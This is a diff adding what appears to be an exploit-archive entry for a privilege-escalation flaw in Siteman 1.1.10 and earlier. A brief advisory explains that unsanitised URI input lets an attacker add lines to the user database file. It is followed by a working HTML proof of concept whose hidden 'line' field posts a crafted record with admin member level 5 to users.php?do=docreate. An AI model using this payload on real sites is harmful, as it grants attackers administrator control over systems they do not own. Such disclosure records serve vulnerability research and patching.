@@ -1,0 +1,43 @@
+source: http://www.securityfocus.com/bid/12304/info
+ 
+Siteman is reported prone to a vulnerability that may allow users to gain elevated privileges. This issue results from insufficient sanitization of user-supplied data.
+ 
+Apparently, an attacker can supply additional lines to the stream used to write to the user database file through a URI parameter. This can allow the attacker to corrupt the user database file and potentially gain administrative privileges to the Siteman application.
+ 
+Siteman 1.1.10 and prior versions are affected by this vulnerability. 
+
+<html>
+<b>These data were recorded.</b><br /><br /><table cellspacing="0"
+cellpadding="2"><tr><td>Username(Use this, and not your display name,
+when
+logging in)</td><td
+align="right">amir452</td></tr><tr><td>Password</td><td
+align="right"><form><select><option>Click to show password</option>
+                                        
+<option>amir452</option></select></form></td></tr><tr><td>Secret
+Question (Asked when you forget your password)</td><td
+align="right">amir452</td></tr><tr><td>Answer to secret
+question</td><td
+align="right"><form>
+<select>
+<option>Click to show answer</option>
+<option>amir452</option>
+</select></form>
+</td></tr><tr><td>Display name</td><td
+align="right">amir452</td></tr><tr><td>Member Level</td><td
+align="right"><b>5</b> (Admin)</td></tr><tr><td>email</td><td
+align="right">amir452@amir452.com</td></tr><tr><td>Hide my email
+adress</td><td align="right">no</td></tr><tr><td>Forum
+Signature</td><td
+align="right">hackers</td></table><br /><br />Is this correct?<br
+/><table
+cellspacing="0" cellpadding="3"><tr><td>
+
+<form action="users.php?do=new" method="post"><input type="submit"
+value="no" /></form></td><td>
+
+<form action="http://www.example.com/users.php?do=docreate"
+method="post">
+                                        <input type="hidden" name="line"
+value="amir452|347a9a8a8d3f364f0bdb82c4208a3207|5|amir452@amir452.com|amir452|1105956827|amir452|347a9a8a8d3f364f0bdb82c4208a3207|0|0|0|hackers"
+/><input type="submit" value="yes" /></form></html>
